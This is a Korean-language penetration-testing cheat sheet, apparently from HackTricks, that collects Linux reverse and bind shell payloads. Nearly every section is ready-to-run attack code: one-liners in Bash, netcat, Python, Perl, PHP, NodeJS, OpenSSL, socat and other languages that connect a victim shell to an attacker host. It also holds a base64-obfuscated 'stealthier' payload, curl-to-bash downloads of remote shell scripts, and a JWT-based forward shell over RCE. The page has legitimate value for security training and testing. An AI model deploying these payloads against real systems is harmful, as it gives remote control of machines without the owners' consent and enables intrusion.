# Shells - Linux

{{#include ../../banners/hacktricks-training.md}}

**이러한 Shells에 대해 궁금한 점이 있다면** [**https://explainshell.com/**](https://explainshell.com/)**에서 확인할 수 있습니다.**<sup>[[9]](#references)</sup>

## Full TTY

**reverse shell을 얻은 후에는**[ **이 페이지를 읽고 full TTY를 획득하세요**](full-ttys.md)**.**

아래에 수집된 기본 reverse-shell payloads는 HighOn.Coffee 및 PayloadsAllTheThings cheat sheets에도 문서화되어 있습니다. 하나를 선택하기 전에 대상에서 해당 interpreter와 utility를 사용할 수 있는지 확인하세요.<sup>[[1]](#references)[[4]](#references)</sup>

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
다른 shell도 확인하는 것을 잊지 마세요: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh, bash.

### Symbol safe shell
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Shell 설명

다음 항목은 Bash의 문서화된 interactive 및 redirection 동작을 요약합니다:<sup>[[10]](#references)[[11]](#references)</sup>

1. **`bash -i`**: 명령의 이 부분은 interactive (`-i`) Bash shell을 시작합니다.
2. **`>&`**: 명령의 이 부분은 **standard output** (`stdout`)과 **standard error** (`stderr`)를 **동일한 destination**으로 **redirecting**하는 shorthand notation입니다.
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: 지정된 IP address 및 port로의 **TCP connection을 나타내는** 특수 파일입니다.
- **output 및 error stream을 이 파일로 redirecting**하면, 명령은 interactive shell session의 output을 공격자의 machine으로 효과적으로 전송합니다.
4. **`0>&1`**: 명령의 이 부분은 **standard input** (`stdin`)을 **standard output** (`stdout`)과 동일한 destination으로 **redirects**합니다.

### 파일에 생성하고 실행
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Forward Shell

RCE를 사용할 수 있지만 방화벽, NAT 또는 outbound filtering으로 reverse shell이 차단된 경우, RCE channel을 통한 forward shell이 semi-interactive session을 제공할 수 있습니다.<sup>[[12]](#references)</sup>

이 목적에 권장되는 tool은 [toboggan](https://github.com/n3rada/toboggan.git)이며, command-execution primitive를 interactive session으로 래핑합니다.<sup>[[12]](#references)</sup>

toboggan을 사용하려면 대상 시스템의 RCE context에 맞춘 Python module을 생성해야 합니다. 이 module interface는 `execute(command, timeout)` function을 필요로 하며, 해당 function은 command output을 반환해야 합니다.<sup>[[12]](#references)</sup> 예를 들어 `nix.py`라는 module은 다음과 같은 구조로 작성할 수 있습니다:
```python3
import jwt
import httpx

def execute(command: str, timeout: float = None) -> str:
# Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
token = jwt.encode(
{"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
)

response = httpx.get(
url="https://vulnerable.io:3200",
headers={"Authorization": f"Bearer {token}"},
timeout=timeout,
# ||BURP||
verify=False,
)

# Check if the request was successful
response.raise_for_status()

return response.text
```
toboggan의 현재 command-line 형식으로 module을 실행합니다:<sup>[[12]](#references)</sup>
```shell
toboggan nix.py
```
이렇게 interactive session이 시작됩니다. 기본 제공되는 Burp Suite backend를 사용하려면 `toboggan --request burp_request.xml`을 사용하고, command-wrapper backend를 사용하려면 `toboggan --exec-wrapper '<command_template>'`을 사용합니다.<sup>[[12]](#references)</sup>

또 다른 방법으로 `IppSec` forward-shell 구현 [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)을 사용할 수 있습니다.<sup>[[13]](#references)</sup>

다음 부분을 수정해야 합니다:<sup>[[13]](#references)</sup>

- 취약한 호스트의 URL
- payload의 prefix와 suffix (있는 경우)
- payload를 전송하는 방식 (headers? data? 추가 정보?)

그런 다음 **send commands**하거나 **`upgrade` command**를 사용해 full PTY를 얻을 수 있습니다. 이 구현은 약 1.3초 간격으로 output을 polling합니다.<sup>[[13]](#references)</sup>

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## BusyBox

BusyBox는 여러 유틸리티를 하나의 작은 실행 파일로 결합하며, 소형 또는 임베디드 Linux 시스템에서 흔히 사용됩니다. 독립 실행형 `nc`가 없다면 BusyBox에서 이를 제공하는지 확인하세요:<sup>[[8]](#references)[[19]](#references)</sup>
```bash
busybox --list-full | grep -E '(^|/)nc$'
busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
busybox nc <ATTACKER-IP> <PORT> -e sh
```
`busybox nc`가 존재하지만 interactive 실행이 불안정한 경우, `nc` 섹션의 FIFO 패턴을 해당 applet에 맞게 적용하세요:<sup>[[2]](#references)[[8]](#references)</sup>
```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
```
## gsocket

[https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)의 공식 deployment 지침을 확인하세요.<sup>[[14]](#references)</sup>
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**공격자**
```bash
while true; do nc -l <port>; done
```
Whois 섹션에서 설명한 것과 동일한 Enter/CTRL+D 입력 시퀀스를 사용합니다.<sup>[[3]](#references)</sup>

**피해자**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat
```bash
victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
attacker> ncat -l <port,eg.443> --ssl
```
## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## Zsh (내장 TCP)
```bash
# Requires no external binaries; leverages zsh/net/tcp module
zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
```
## Rustcat (rcat)

[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – Rust로 작성된 modern netcat-like listener입니다.<sup>[[5]](#references)</sup>
```bash
# Attacker – interactive listener with history & tab-completion
rcat listen -ib 55600

# Victim – download a Linux release binary and connect back with /bin/bash
curl -L https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-linux-x86_64 -o /tmp/rcat \
&& chmod +x /tmp/rcat \
&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
```
프로젝트에 문서화된 기능은 다음과 같습니다:<sup>[[5]](#references)</sup>
- interactive mode에서 Command history 및 tab completion
- `connect`에서 사용할 shell executable을 선택하는 `-s`

## pwncat-cs

이미 **raw reverse shell**이 있지만 더 사용하기 편한 세션을 설정할 수 있는 listener가 필요한 경우, `pwncat-cs`가 연결을 처리하고 remote PTY를 시도할 수 있습니다.<sup>[[7]](#references)</sup>
```bash
# Attacker - catch a plain reverse shell and auto-upgrade it when possible
python3 -m pip install --user pwncat-cs
pwncat-cs -lp 4444

# Victim - reuse any payload from this page
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
```
또한 **암호화된** `ssl-bind` 및 `ssl-connect` 채널을 지원하므로, 전송 암호화가 필요할 때 `ncat --ssl` 또는 `socat OPENSSL:` payloads와 함께 사용할 수 있습니다.<sup>[[7]](#references)</sup>

## revsh (암호화 및 피벗 지원)

`revsh`는 **암호화된 Diffie-Hellman tunnel**을 통해 완전한 TTY를 제공하며, reverse VPN과 유사한 pivoting을 위해 **TUN/TAP** 인터페이스를 선택적으로 연결할 수 있는 소형 C client/server입니다.<sup>[[6]](#references)</sup>
```bash
# Build after preparing the OpenSSL dependency as described in the repository README
git clone https://github.com/emptymonkey/revsh && cd revsh && make

# Attacker – controller/listener on 443
revsh -c 0.0.0.0:443

# Victim – reverse shell over the encrypted tunnel
./revsh <ATTACKER-IP>:443
```
`revsh`에 문서화된 유용한 플래그는 다음과 같습니다:<sup>[[6]](#references)</sup>
- `-b`: bind-shell 모드 (양쪽에서 활성화)
- `-D [LHOST:]LPORT` 또는 `-B [RHOST:]RPORT`: dynamic SOCKS 4/4a/5 forwarding
- `-x`: 기본 TUN/TAP 설정을 포함하여 proxies의 자동 설정 비활성화

암호화된 터널은 shell traffic이 plaintext로 노출되는 것을 방지하지만, 그 자체로 network policy를 우회하지는 않습니다.<sup>[[6]](#references)</sup>

## OpenSSL

이 섹션에서는 OpenSSL의 `req`, `s_server`, `s_client` 명령을 사용하여 certificate를 생성하고 TLS를 통해 shell을 전달합니다.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

공격자 (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
```
피해자
```bash
#Linux - one-port TLS shell using a named pipe
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s

#If the target needs SNI / hostname validation to blend with a fronted TLS service
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
```
분리된 입력/출력 채널이 필요할 때는 여전히 고전적인 **two-listener** 패턴을 사용할 수 있습니다.<sup>[[16]](#references)[[17]](#references)</sup>
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
## Finger

**공격자**
```bash
while true; do nc -l 79; done
```
명령을 보내려면 명령을 입력하고 Enter를 누른 다음 CTRL+D를 누르세요(STDIN을 중지하기 위해).<sup>[[3]](#references)</sup>

**피해자**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

이는 포트 6001에서 시스템에 연결을 시도합니다.<sup>[[2]](#references)</sup>
```bash
xterm -display 10.0.0.1:1
```
reverse shell을 수신하려면 아래와 같이 6001번 포트에서 수신 대기 중인 X server를 사용합니다.<sup>[[2]](#references)</sup>
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

작성자: [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76). 참고: Java reverse shell도 Groovy에서 작동합니다.<sup>[[18]](#references)</sup>
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## References

- [1] [Reverse Shell Cheat Sheet: PHP, ASP, Netcat, Bash & Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [2] [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [3] [Whois와 Finger를 사용한 Reverse Shell](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
- [4] [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [5] [rustcat - 최신 포트 listener 및 reverse shell](https://github.com/robiot/rustcat)
- [6] [revsh - terminal 지원, data tunneling 및 advanced pivoting capabilities를 갖춘 reverse shell](https://github.com/emptymonkey/revsh)
- [7] [pwncat (pwncat-cs) - post-exploitation 플랫폼](https://github.com/calebstewart/pwncat)
- [8] [busybox | GTFOBins](https://gtfobins.org/gtfobins/busybox/)
- [9] [explainshell.com](https://explainshell.com/)
- [10] [Bash Reference Manual: Redirections](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
- [11] [Bash Reference Manual: Invoking Bash](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
- [12] [toboggan](https://github.com/n3rada/toboggan)
- [13] [forward-shell](https://github.com/IppSec/forward-shell)
- [14] [Global Socket 배포 instructions](https://www.gsocket.io/deploy/)
- [15] [openssl-req](https://docs.openssl.org/4.0/man1/openssl-req/)
- [16] [openssl-s_server](https://docs.openssl.org/master/man1/openssl-s_server/)
- [17] [openssl-s_client](https://docs.openssl.org/master/man1/openssl-s_client/)
- [18] [Pure Groovy/Java Reverse Shell](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
- [19] [BusyBox](https://busybox.net/about.html)
{{#include ../../banners/hacktricks-training.md}}
